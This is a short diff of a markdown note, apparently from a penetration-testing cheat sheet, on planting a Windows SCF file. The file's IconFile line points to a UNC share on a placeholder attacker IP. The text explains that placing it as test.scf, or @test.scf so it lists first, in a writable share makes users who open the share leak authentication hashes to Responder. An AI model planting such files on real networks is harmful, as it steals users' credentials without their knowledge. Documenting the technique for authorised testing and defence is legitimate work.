@@ -6,6 +6,6 @@ IconFile=\\X.X.X.X\share\pentestlab.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
-
+**Note: The icon file should be the same as the scf file.**
 
 Put this file as test.scf in any writeable share and when user open the share you will get hit in responder. You can add @ to the file like @test.scf and the file will apear first in share.
